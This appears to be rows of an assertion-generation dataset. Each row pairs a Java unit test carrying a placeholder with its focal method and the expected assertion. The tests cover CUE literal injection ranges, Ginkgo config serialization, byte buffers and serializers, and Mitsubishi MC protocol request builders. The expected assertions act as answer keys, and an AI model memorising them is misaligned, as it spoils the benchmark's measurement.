findInjectionRanges(CueStringLiteral context) { var totalRange = context.getLiteralContentRange(); var interpolations = context.getInterpolationList() .stream() .map(PsiElement::getTextRangeInParent) .sorted(Comparator.comparingInt(TextRange::getStartOffset)) .collect(Collectors.toList());  if (interpolations.isEmpty()) { return Collections.singletonList(new InjectionData(totalRange, null, null)); }  var hostText = context.getText(); var result = new LinkedList<InjectionData>(); var lastStart = totalRange.getStartOffset(); var lastEnd = totalRange.getStartOffset(); for (TextRange range : interpolations) { var start = range.getStartOffset(); var end = range.getEndOffset(); if (start == totalRange.getStartOffset()) { // interpolation at start, insert empty range before to allow editing result.add(new InjectionData(TextRange.create(start, start), null, null)); } else if (start > lastEnd) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, start), prefix, null)); } lastStart = start; lastEnd = end; } if (lastEnd < totalRange.getEndOffset()) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } else if (lastEnd == totalRange.getEndOffset() && lastEnd > lastStart) { var prefix = hostText.substring(lastStart, lastEnd); result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } return result; }"	assertEquals(expected, ranges)
"interpolationMultiple() { createCueFile(""'a\\(1)b\\(2)b\\(3)'""); var literal = findTypedElement(CueStringLiteral.class); var ranges = CueMultiHostInjector.findInjectionRanges(literal);  var expected = Arrays.asList( new InjectionData(TextRange.create(1, 2), null, null), new InjectionData(TextRange.create(6, 7), ""\\(1)"", null), new InjectionData(TextRange.create(11, 12), ""\\(2)"", null), new InjectionData(TextRange.create(16, 16), ""\\(3)"", null)); ""<AssertPlaceHolder>""; }
findInjectionRanges(CueStringLiteral context) { var totalRange = context.getLiteralContentRange(); var interpolations = context.getInterpolationList() .stream() .map(PsiElement::getTextRangeInParent) .sorted(Comparator.comparingInt(TextRange::getStartOffset)) .collect(Collectors.toList());  if (interpolations.isEmpty()) { return Collections.singletonList(new InjectionData(totalRange, null, null)); }  var hostText = context.getText(); var result = new LinkedList<InjectionData>(); var lastStart = totalRange.getStartOffset(); var lastEnd = totalRange.getStartOffset(); for (TextRange range : interpolations) { var start = range.getStartOffset(); var end = range.getEndOffset(); if (start == totalRange.getStartOffset()) { // interpolation at start, insert empty range before to allow editing result.add(new InjectionData(TextRange.create(start, start), null, null)); } else if (start > lastEnd) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, start), prefix, null)); } lastStart = start; lastEnd = end; } if (lastEnd < totalRange.getEndOffset()) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } else if (lastEnd == totalRange.getEndOffset() && lastEnd > lastStart) { var prefix = hostText.substring(lastStart, lastEnd); result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } return result; }"	assertEquals(expected, ranges)
"test_serialized_deserialize_all_test_config() { GinkgoRunConfigurationOptions configOptions = new GinkgoRunConfigurationOptions(); configOptions.setGinkgoExecutable(""ginkgo""); configOptions.setWorkingDir(""/workspace""); configOptions.setEnvData(EnvironmentVariablesData.DEFAULT); configOptions.setGinkgoAdditionalOptions(""-race""); configOptions.setGinkgoScope(GinkgoScope.ALL); configOptions.setFocusTestExpression(""""); configOptions.setTestNames(Arrays.asList(""ginkgo all"")); configOptions.setGoToolOptions(""build tool options""); Element element = new Element(""ginkgo_config"");  GinkgoSerializationUtil.writeXml(element, configOptions); GinkgoRunConfigurationOptions result = GinkgoSerializationUtil.readXml(element);  ""<AssertPlaceHolder>""; }
readXml(@NotNull Element element) { GinkgoRunConfigurationOptions ginkgoRunConfigurationOptions = new GinkgoRunConfigurationOptions(); ginkgoRunConfigurationOptions.setGinkgoExecutable(read(element, GINKGO_EXECUTABLE)); ginkgoRunConfigurationOptions.setWorkingDir(read(element, WORKING_DIR)); ginkgoRunConfigurationOptions.setEnvData(EnvironmentVariablesData.readExternal(element)); ginkgoRunConfigurationOptions.setGinkgoAdditionalOptions(read(element, GINKGO_ADDITIONAL_OPTIONS)); ginkgoRunConfigurationOptions.setGoToolOptions(read(element, GO_TOOL_OPTIONS)); ginkgoRunConfigurationOptions.setGinkgoScope(readScope(element)); ginkgoRunConfigurationOptions.setFocusTestExpression(read(element, FOCUS_EXPRESSION)); ginkgoRunConfigurationOptions.setPackageName(read(element, PACKAGE_NAME)); ginkgoRunConfigurationOptions.setTestNames(readTestNames(element));  return ginkgoRunConfigurationOptions; }"	assertEquals(configOptions, result)
"test_serialized_deserialize_focus_test_config() { GinkgoRunConfigurationOptions configOptions = new GinkgoRunConfigurationOptions(); configOptions.setGinkgoExecutable(""ginkgo""); configOptions.setWorkingDir(""/workspace""); configOptions.setEnvData(EnvironmentVariablesData.DEFAULT); configOptions.setGinkgoAdditionalOptions(""-race""); configOptions.setGinkgoScope(GinkgoScope.FOCUS); configOptions.setFocusTestExpression(""books""); configOptions.setTestNames(Arrays.asList(""books"")); configOptions.setGoToolOptions(""build tool options""); Element element = new Element(""ginkgo_config"");  GinkgoSerializationUtil.writeXml(element, configOptions); GinkgoRunConfigurationOptions result = GinkgoSerializationUtil.readXml(element);  ""<AssertPlaceHolder>""; }
readXml(@NotNull Element element) { GinkgoRunConfigurationOptions ginkgoRunConfigurationOptions = new GinkgoRunConfigurationOptions(); ginkgoRunConfigurationOptions.setGinkgoExecutable(read(element, GINKGO_EXECUTABLE)); ginkgoRunConfigurationOptions.setWorkingDir(read(element, WORKING_DIR)); ginkgoRunConfigurationOptions.setEnvData(EnvironmentVariablesData.readExternal(element)); ginkgoRunConfigurationOptions.setGinkgoAdditionalOptions(read(element, GINKGO_ADDITIONAL_OPTIONS)); ginkgoRunConfigurationOptions.setGoToolOptions(read(element, GO_TOOL_OPTIONS)); ginkgoRunConfigurationOptions.setGinkgoScope(readScope(element)); ginkgoRunConfigurationOptions.setFocusTestExpression(read(element, FOCUS_EXPRESSION)); ginkgoRunConfigurationOptions.setPackageName(read(element, PACKAGE_NAME)); ginkgoRunConfigurationOptions.setTestNames(readTestNames(element));  return ginkgoRunConfigurationOptions; }"	assertEquals(configOptions, result)
"getByte() { ByteReadBuff buff = new ByteReadBuff(new byte[]{(byte) 0x55}); byte actual = buff.getByte(); ""<AssertPlaceHolder>""; }
getByte() { byte res = this.getByte(this.offset); this.offset++; return res; }"	assertEquals((byte) 0x55, actual)
"getByteToInt() { ByteReadBuff buff = new ByteReadBuff(new byte[]{(byte) 0x55}); int actual = buff.getByteToInt(); ""<AssertPlaceHolder>""; }
getByteToInt() { int res = this.getByteToInt(this.offset); this.offset++; return res; }"	assertEquals(85, actual)
"getUInt16() { ByteReadBuff buff = new ByteReadBuff(new byte[]{(byte) 0x5F, (byte) 0xF5}); int actual = buff.getUInt16(); ""<AssertPlaceHolder>""; }
getUInt16() { int res = this.getUInt16(this.offset); this.offset += 2; return res; }"	assertEquals(24565, actual)
"getUInt32() { ByteReadBuff buff = new ByteReadBuff(new byte[]{(byte) 0x00, (byte) 0x20, (byte) 0x37, (byte) 0x36}); long actual = buff.getUInt32(); ""<AssertPlaceHolder>""; }
getUInt32() { long res = this.getUInt32(this.offset); this.offset += 4; return res; }"	assertEquals(2111286L, actual)
"getString() { ByteReadBuff buff = new ByteReadBuff(new byte[]{(byte) 0x30, (byte) 0x31, (byte) 0x32, (byte) 0x33}); String actual = buff.getString(4); ""<AssertPlaceHolder>""; }
getString(int length) { String res = this.getString(this.offset, length); this.offset += length; return res; }"	"assertEquals(""0123"", actual)"
"toByteArrayList() { byte[] expect = new byte[]{(byte) 0x81, // 0, 25689 (byte) 0x00, (byte) 0x00, (byte) 0x64, (byte) 0x59, // 523975585 (byte) 0x1F, (byte) 0x3B, (byte) 0x3B, (byte) 0xA1, (byte) 0x1F, (byte) 0x3B, (byte) 0x3B, (byte) 0xA1, // 33.16f, -15.62f (byte) 0x42, (byte) 0x04, (byte) 0xA3, (byte) 0xD7, (byte) 0xC1, (byte) 0x79, (byte) 0xEB, (byte) 0x85, // 156665.35455556 (byte) 0x41, (byte) 0x03, (byte) 0x1F, (byte) 0xCA, (byte) 0xD6, (byte) 0x21, (byte) 0x39, (byte) 0xB7, // -56516.66664 (byte) 0xC0, (byte) 0xEB, (byte) 0x98, (byte) 0x95, (byte) 0x55, (byte) 0x1D, (byte) 0x68, (byte) 0xC7, // 23A (byte) 0x32, (byte) 0x33, (byte) 0x41};  ByteArraySerializer serializer = ByteArraySerializer.newInstance(); ByteArrayListBean listBean = serializer.toObject(ByteArrayListBean.class, expect); byte[] actual = serializer.toByteArray(listBean); ""<AssertPlaceHolder>""; }
toByteArray(final T targetBean) { try { // 组装数据，同时计算最大的字节长度 int buffSize = 0; List<ByteArrayParseData> parseDataList = new ArrayList<>(); for (final Field field : targetBean.getClass().getDeclaredFields()) { final ByteArrayVariable variable = field.getAnnotation(ByteArrayVariable.class); if (variable == null) { continue; } ByteArrayParameter parameter = new ByteArrayParameter(variable.byteOffset(), variable.bitOffset(), variable.count(), variable.type(), variable.littleEndian(), variable.format()); this.checkByteArrayVariable(parameter); parseDataList.add(new ByteArrayParseData(variable, field)); int maxPos = variable.byteOffset() + variable.count() * variable.type().getByteLength(); if (maxPos > buffSize) { buffSize = maxPos; } } if (buffSize == 0 || parseDataList.isEmpty()) { return new byte[0]; } // 填充字节数组的内容 ByteWriteBuff buff = ByteWriteBuff.newInstance(buffSize); for (ByteArrayParseData item : parseDataList) { item.getField().setAccessible(true); Object data = item.getField().get(targetBean); if (data == null) { continue; } if (item.getVariable().count() == 1) { this.fillOneData(item.getVariable(), data, buff, 0); } else { this.fillListData(item.getVariable(), data, buff); } } return buff.getData(); } catch (Exception e) { throw new ByteArrayParseException(""parsing to object error, cause:"" + e.getMessage(), e); } }"	assertArrayEquals(expect, actual)
"toByteArray1() { ByteArraySerializer serializer = ByteArraySerializer.newInstance(); byte[] expect = new byte[]{(byte) 0x01, // 0, 25689 (byte) 0x59, (byte) 0x64, (byte) 0x00, (byte) 0x00, // 523975585 (byte) 0xA1, (byte) 0x3B, (byte) 0x3B, (byte) 0x1F, (byte) 0xA1, (byte) 0x3B, (byte) 0x3B, (byte) 0x1F, // 33.16f, -15.62f (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xD7, (byte) 0xA3, (byte) 0x04, (byte) 0x42, // 156665.35455556 (byte) 0xB7, (byte) 0x39, (byte) 0x21, (byte) 0xD6, (byte) 0xCA, (byte) 0x1F, (byte) 0x03, (byte) 0x41, // -56516.66664 (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, // 23A (byte) 0x32, (byte) 0x33, (byte) 0x41};  ByteArrayLittleEndianBean bean = serializer.toObject(ByteArrayLittleEndianBean.class, expect); byte[] actual = serializer.toByteArray(bean); ""<AssertPlaceHolder>""; }
toByteArray(final T targetBean) { try { // 组装数据，同时计算最大的字节长度 int buffSize = 0; List<ByteArrayParseData> parseDataList = new ArrayList<>(); for (final Field field : targetBean.getClass().getDeclaredFields()) { final ByteArrayVariable variable = field.getAnnotation(ByteArrayVariable.class); if (variable == null) { continue; } ByteArrayParameter parameter = new ByteArrayParameter(variable.byteOffset(), variable.bitOffset(), variable.count(), variable.type(), variable.littleEndian(), variable.format()); this.checkByteArrayVariable(parameter); parseDataList.add(new ByteArrayParseData(variable, field)); int maxPos = variable.byteOffset() + variable.count() * variable.type().getByteLength(); if (maxPos > buffSize) { buffSize = maxPos; } } if (buffSize == 0 || parseDataList.isEmpty()) { return new byte[0]; } // 填充字节数组的内容 ByteWriteBuff buff = ByteWriteBuff.newInstance(buffSize); for (ByteArrayParseData item : parseDataList) { item.getField().setAccessible(true); Object data = item.getField().get(targetBean); if (data == null) { continue; } if (item.getVariable().count() == 1) { this.fillOneData(item.getVariable(), data, buff, 0); } else { this.fillListData(item.getVariable(), data, buff); } } return buff.getData(); } catch (Exception e) { throw new ByteArrayParseException(""parsing to object error, cause:"" + e.getMessage(), e); } }"	assertArrayEquals(expect, actual)
"toByteArray2() { ByteArraySerializer serializer = ByteArraySerializer.newInstance(); byte[] expect = new byte[]{(byte) 0x01, // 0, 25689 (byte) 0x00, (byte) 0x00, (byte) 0x64, (byte) 0x59, // 523975585 (byte) 0x3B, (byte) 0xA1, (byte) 0x1F, (byte) 0x3B, (byte) 0x3B, (byte) 0xA1, (byte) 0x1F, (byte) 0x3B, // 33.16f, -15.62f (byte) 0xA3, (byte) 0xD7, (byte) 0x42, (byte) 0x04, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, // 156665.35455556 (byte) 0xD6, (byte) 0x21, (byte) 0x39, (byte) 0xB7, (byte) 0x41, (byte) 0x03, (byte) 0x1F, (byte) 0xCA, // -56516.66664 (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, // 23A (byte) 0x32, (byte) 0x33, (byte) 0x41};  ByteFormatBean bean = serializer.toObject(ByteFormatBean.class, expect); byte[] actual = serializer.toByteArray(bean); ""<AssertPlaceHolder>""; bean.getInt32Data().byteValue(); }
toByteArray(final T targetBean) { try { // 组装数据，同时计算最大的字节长度 int buffSize = 0; List<ByteArrayParseData> parseDataList = new ArrayList<>(); for (final Field field : targetBean.getClass().getDeclaredFields()) { final ByteArrayVariable variable = field.getAnnotation(ByteArrayVariable.class); if (variable == null) { continue; } ByteArrayParameter parameter = new ByteArrayParameter(variable.byteOffset(), variable.bitOffset(), variable.count(), variable.type(), variable.littleEndian(), variable.format()); this.checkByteArrayVariable(parameter); parseDataList.add(new ByteArrayParseData(variable, field)); int maxPos = variable.byteOffset() + variable.count() * variable.type().getByteLength(); if (maxPos > buffSize) { buffSize = maxPos; } } if (buffSize == 0 || parseDataList.isEmpty()) { return new byte[0]; } // 填充字节数组的内容 ByteWriteBuff buff = ByteWriteBuff.newInstance(buffSize); for (ByteArrayParseData item : parseDataList) { item.getField().setAccessible(true); Object data = item.getField().get(targetBean); if (data == null) { continue; } if (item.getVariable().count() == 1) { this.fillOneData(item.getVariable(), data, buff, 0); } else { this.fillListData(item.getVariable(), data, buff); } } return buff.getData(); } catch (Exception e) { throw new ByteArrayParseException(""parsing to object error, cause:"" + e.getMessage(), e); } }"	assertArrayEquals(expect, actual)
"createReadDeviceBatchInWordReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x0C, 0x00, 0x0C, 0x00, 0x01, 0x04, 0x00, 0x00, 0x58, 0x1B, 0x00, (byte) 0xA8, 0x02, 0x00 }; McDeviceAddress deviceAddress = new McDeviceAddress(EMcDeviceCode.D, 7000, 2); McMessageReq req = McReqBuilder.createReadDeviceBatchInWordReq(deviceAddress); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createReadDeviceBatchInWordReq(McDeviceAddress deviceAddress) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createReadDeviceBatchInWordReq(EMcSeries.QnA, header, deviceAddress); }"	assertArrayEquals(expect, actual)
"testCreateReadDeviceBatchInWordReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x0E, 0x00, 0x0C, 0x00, 0x01, 0x04, 0x02, 0x00, 0x58, 0x1B, 0x00, 0x00, (byte) 0xA8, 0x00, 0x02, 0x00 }; McDeviceAddress deviceAddress = new McDeviceAddress(EMcDeviceCode.D, 7000, 2); McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McMessageReq req = McReqBuilder.createReadDeviceBatchInWordReq(EMcSeries.IQ_R, header, deviceAddress); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createReadDeviceBatchInWordReq(EMcSeries series, McHeaderReq header, McDeviceAddress deviceAddress) { if (series.getFrameType() == EMcFrameType.FRAME_1E) { header.setSubHeader(EMcCommand.DEVICE_ACCESS_BATCH_READ_IN_WORD.getCode()); } McReadDeviceBatchInWordReqData data = new McReadDeviceBatchInWordReqData(series, deviceAddress); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"createReadDeviceBatchInBitReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x0C, 0x00, 0x0C, 0x00, 0x01, 0x04, 0x01, 0x00, 0x58, 0x1B, 0x00, (byte) 0xA8, 0x02, 0x00 }; McDeviceAddress deviceAddress = new McDeviceAddress(EMcDeviceCode.D, 7000, 2); McMessageReq req = McReqBuilder.createReadDeviceBatchInBitReq(deviceAddress); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createReadDeviceBatchInBitReq(McDeviceAddress deviceAddress) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createReadDeviceBatchInBitReq(EMcSeries.QnA, header, deviceAddress); }"	assertArrayEquals(expect, actual)
"testCreateReadDeviceBatchInBitReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x0E, 0x00, 0x0C, 0x00, 0x01, 0x04, 0x02, 0x00, 0x58, 0x1B, 0x00, 0x00, (byte) 0xA8, 0x00, 0x02, 0x00 }; McDeviceAddress deviceAddress = new McDeviceAddress(EMcDeviceCode.D, 7000, 2); McHeaderReq header =McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McMessageReq req = McReqBuilder.createReadDeviceBatchInWordReq(EMcSeries.IQ_R, header, deviceAddress); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createReadDeviceBatchInWordReq(EMcSeries series, McHeaderReq header, McDeviceAddress deviceAddress) { if (series.getFrameType() == EMcFrameType.FRAME_1E) { header.setSubHeader(EMcCommand.DEVICE_ACCESS_BATCH_READ_IN_WORD.getCode()); } McReadDeviceBatchInWordReqData data = new McReadDeviceBatchInWordReqData(series, deviceAddress); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"createWriteDeviceBatchInWordReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x12, 0x00, 0x0C, 0x00, 0x01, 0x14, 0x00, 0x00, 0x58, 0x1B, 0x00, (byte) 0xA8, 0x03, 0x00, (byte) 0x95, 0x19, 0x02, 0x12, 0x30, 0x11 }; byte[] data = new byte[]{(byte) 0x95, 0x19, 0x02, 0x12, 0x30, 0x11}; McDeviceContent deviceAddress = new McDeviceContent(EMcDeviceCode.D, 7000, 3, data); McMessageReq req = McReqBuilder.createWriteDeviceBatchInWordReq(deviceAddress); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceBatchInWordReq(McDeviceContent deviceContent) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createWriteDeviceBatchInWordReq(EMcSeries.QnA, header, deviceContent); }"	assertArrayEquals(expect, actual)
"testCreateWriteDeviceBatchInWordReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x14, 0x00, 0x0C, 0x00, 0x01, 0x14, 0x02, 0x00, 0x58, 0x1B, 0x00, 0x00, (byte) 0xA8, 0x00, 0x03, 0x00, (byte) 0x95, 0x19, 0x02, 0x12, 0x30, 0x11 }; byte[] data = new byte[]{(byte) 0x95, 0x19, 0x02, 0x12, 0x30, 0x11}; McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McDeviceContent deviceAddress = new McDeviceContent(EMcDeviceCode.D, 7000, 3, data); McMessageReq req = McReqBuilder.createWriteDeviceBatchInWordReq(EMcSeries.IQ_R, header, deviceAddress); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceBatchInWordReq(EMcSeries series, McHeaderReq header, McDeviceContent deviceContent) { if (series.getFrameType() == EMcFrameType.FRAME_1E) { header.setSubHeader(EMcCommand.DEVICE_ACCESS_BATCH_WRITE_IN_WORD.getCode()); } McWriteDeviceBatchInWordReqData data = new McWriteDeviceBatchInWordReqData(series, deviceContent); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"createWriteDeviceBatchInBitReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x10, 0x00, 0x0C, 0x00, 0x01, 0x14, 0x01, 0x00, 0x58, 0x1B, 0x00, (byte) 0xA8, 0x08, 0x00, 0x11, 0x00, 0x11, 0x00 }; byte[] data = new byte[]{0x11, 0x00, 0x11, 0x00}; McDeviceContent deviceAddress = new McDeviceContent(EMcDeviceCode.D, 7000, 8, data); McMessageReq req = McReqBuilder.createWriteDeviceBatchInBitReq(deviceAddress); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceBatchInBitReq(McDeviceContent deviceContent) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createWriteDeviceBatchInBitReq(EMcSeries.QnA, header, deviceContent); }"	assertArrayEquals(expect, actual)
"testCreateWriteDeviceBatchInBitReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x12, 0x00, 0x0C, 0x00, 0x01, 0x14, 0x03, 0x00, 0x58, 0x1B, 0x00, 0x00, (byte) 0xA8, 0x00, 0x08, 0x00, 0x11, 0x00, 0x11, 0x00 }; byte[] data = new byte[]{0x11, 0x00, 0x11, 0x00}; McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McDeviceContent deviceAddress = new McDeviceContent(EMcDeviceCode.D, 7000, 8, data); McMessageReq req = McReqBuilder.createWriteDeviceBatchInBitReq(EMcSeries.IQ_R, header, deviceAddress); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceBatchInBitReq(EMcSeries series, McHeaderReq header, McDeviceContent deviceContent) { if (series.getFrameType() == EMcFrameType.FRAME_1E) { header.setSubHeader(EMcCommand.DEVICE_ACCESS_BATCH_WRITE_IN_BIT.getCode()); } McWriteDeviceBatchInBitReqData data = new McWriteDeviceBatchInBitReqData(series, deviceContent); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"createReadDeviceRandomInWordReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x24, 0x00, 0x0C, 0x00, 0x03, 0x04, 0x00, 0x00, 0x04, 0x03, 0x00, 0x00, 0x00, (byte) 0xA8, 0x00, 0x00, 0x00, (byte) 0xC2, 0x64, 0x00, 0x00, (byte) 0x90, 0x20, 0x00, 0x00, (byte) 0x9C, (byte) 0xDC, 0x05, 0x00, (byte) 0xA8, 0x60, 0x01, 0x00, (byte) 0x9D, 0x57, 0x04, 0x00, (byte) 0x90 }; List<McDeviceAddress> wordAddresses = new ArrayList<>(); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.D, 0, 1)); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.TN, 0, 1)); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.M, 100, 1)); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.X, 0x20, 1));  List<McDeviceAddress> dwordAddresses = new ArrayList<>(); dwordAddresses.add(new McDeviceAddress(EMcDeviceCode.D, 1500, 1)); dwordAddresses.add(new McDeviceAddress(EMcDeviceCode.Y, 0x160, 1)); dwordAddresses.add(new McDeviceAddress(EMcDeviceCode.M, 1111, 1)); McMessageReq req = McReqBuilder.createReadDeviceRandomInWordReq(wordAddresses, dwordAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createReadDeviceRandomInWordReq(List<McDeviceAddress> wordAddresses, List<McDeviceAddress> dwordAddresses) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createReadDeviceRandomInWordReq(EMcSeries.QnA, header, wordAddresses, dwordAddresses); }"	assertArrayEquals(expect, actual)
"testCreateReadDeviceRandomInWordReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x32, 0x00, 0x0C, 0x00, 0x03, 0x04, 0x02, 0x00, 0x04, 0x03, 0x00, 0x00, 0x00, 0x00, (byte) 0xA8, 0x00, 0x00, 0x00, 0x00, 0x00, (byte) 0xC2, 0x00, 0x64, 0x00, 0x00, 0x00, (byte) 0x90, 0x00, 0x20, 0x00, 0x00, 0x00, (byte) 0x9C, 0x00, (byte) 0xDC, 0x05, 0x00, 0x00, (byte) 0xA8, 0x00, 0x60, 0x01, 0x00, 0x00, (byte) 0x9D, 0x00, 0x57, 0x04, 0x00, 0x00, (byte) 0x90, 0x00, }; List<McDeviceAddress> wordAddresses = new ArrayList<>(); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.D, 0)); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.TN, 0)); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.M, 100)); wordAddresses.add(new McDeviceAddress(EMcDeviceCode.X, 0x20));  List<McDeviceAddress> dwordAddresses = new ArrayList<>(); dwordAddresses.add(new McDeviceAddress(EMcDeviceCode.D, 1500)); dwordAddresses.add(new McDeviceAddress(EMcDeviceCode.Y, 0x160)); dwordAddresses.add(new McDeviceAddress(EMcDeviceCode.M, 1111)); McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), 3000); McMessageReq req = McReqBuilder.createReadDeviceRandomInWordReq(EMcSeries.IQ_R, header, wordAddresses, dwordAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createReadDeviceRandomInWordReq(EMcSeries series, McHeaderReq header, List<McDeviceAddress> wordAddresses, List<McDeviceAddress> dwordAddresses) { if (series.getFrameType() == EMcFrameType.FRAME_1E) { header.setSubHeader(EMcCommand.DEVICE_ACCESS_RANDOM_WRITE_IN_WORD.getCode()); } McReadDeviceRandomInWordReqData data = new McReadDeviceRandomInWordReqData(series, wordAddresses, dwordAddresses); McMessageReq req = new McMessageReq(header, data); req.selfCheck(); return req; }"	assertArrayEquals(expect, actual)
"createWriteDeviceRandomInWordReq() { byte[] expect = new byte[]{ 0x50, 0x00, 0x00, (byte) 0xFF, (byte) 0xFF, 0x03, 0x00, 0x38, 0x00, 0x0C, 0x00, 0x02, 0x14, 0x00, 0x00, 0x04, 0x03, 0x00, 0x00, 0x00, (byte) 0xA8, 0x50, 0x05, 0x01, 0x00, 0x00, (byte) 0xA8, 0x75, 0x05, 0x64, 0x00, 0x00, (byte) 0x90, 0x40, 0x05, 0x20, 0x00, 0x00, (byte) 0x9C, (byte) 0x83, 0x05, (byte) 0xDC, 0x05, 0x00, (byte) 0xA8, 0x02, 0x12, 0x39, 0x04, 0x60, 0x01, 0x00, (byte) 0x9D, 0x07, 0x26, 0x75, 0x23, 0x57, 0x04, 0x00, (byte) 0x90, 0x75, 0x04, 0x25, 0x04 }; List<McDeviceContent> wordAddresses = new ArrayList<>(); wordAddresses.add(new McDeviceContent(EMcDeviceCode.D, 0, new byte[]{0x50, 0x05})); wordAddresses.add(new McDeviceContent(EMcDeviceCode.D, 1, new byte[]{0x75, 0x05})); wordAddresses.add(new McDeviceContent(EMcDeviceCode.M, 100, new byte[]{0x40, 0x05})); wordAddresses.add(new McDeviceContent(EMcDeviceCode.X, 0x20, new byte[]{(byte) 0x83, 0x05}));  List<McDeviceContent> dwordAddresses = new ArrayList<>(); dwordAddresses.add(new McDeviceContent(EMcDeviceCode.D, 1500, new byte[]{0x02, 0x12, 0x39, 0x04})); dwordAddresses.add(new McDeviceContent(EMcDeviceCode.Y, 0x160, new byte[]{0x07, 0x26, 0x75, 0x23})); dwordAddresses.add(new McDeviceContent(EMcDeviceCode.M, 1111, new byte[]{0x75, 0x04, 0x25, 0x04})); McMessageReq req = McReqBuilder.createWriteDeviceRandomInWordReq(wordAddresses, dwordAddresses); byte[] actual = req.toByteArray(); ""<AssertPlaceHolder>""; }
createWriteDeviceRandomInWordReq(List<McDeviceContent> wordContents, List<McDeviceContent> dwordContents) { McHeaderReq header = McHeaderReq.createByFrameType(EMcFrameType.FRAME_3E, McFrame4E3EAccessRoute.createDefault(), MONITORING_TIMER_DEFAULT); return createWriteDeviceRandomInWordReq(EMcSeries.QnA, header, wordContents, dwordContents); }"	assertArrayEquals(expect, actual)
